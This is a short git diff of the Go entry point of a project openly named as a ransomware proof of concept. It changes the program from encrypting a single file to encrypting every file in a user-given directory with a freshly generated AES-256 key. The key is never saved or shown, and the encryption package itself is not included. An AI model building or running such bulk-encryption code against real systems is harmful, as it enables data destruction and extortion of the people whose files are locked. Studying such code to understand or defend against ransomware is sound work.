@@ -2,23 +2,30 @@ package main
 
 import (
 	"fmt"
-	"github.com/arviiyer/ransomware-poc/encryption" // Import the encryption package
+	"github.com/arviiyer/ransomware-poc/encryption" // Import your encryption package
 )
 
-func main() {
-	var inputFile string
-	fmt.Print("Enter file path: ")
-	fmt.Scanln(&inputFile)
+func getUserInput() string {
+	var dirPath string
+	fmt.Print("Enter directory path: ")
+	fmt.Scanln(&dirPath)
+	fmt.Println("Entered directory path: ", dirPath)
+	return dirPath
+}
 
-	// Generate the AES-256 key
+func main() {
+	// Get the directory from the user
+	dirPath := getUserInput()
+
+	// Generate an AES-256 encryption key
 	key := encryption.GenerateAESKey()
 
-	// Encrypt the file
-	err := encryption.EncryptFile(inputFile, key)
+	// Encrypt all files in the directory
+	err := encryption.EncryptFilesInDirectory(dirPath, key)
 	if err != nil {
-		fmt.Println("Error during encryption:", err)
+		fmt.Println("Error encrypting files in the directory:", err)
 	} else {
-		fmt.Println("File encrypted successfully!")
+		fmt.Println("All files in the directory were encrypted successfully!")
 	}
 }
 
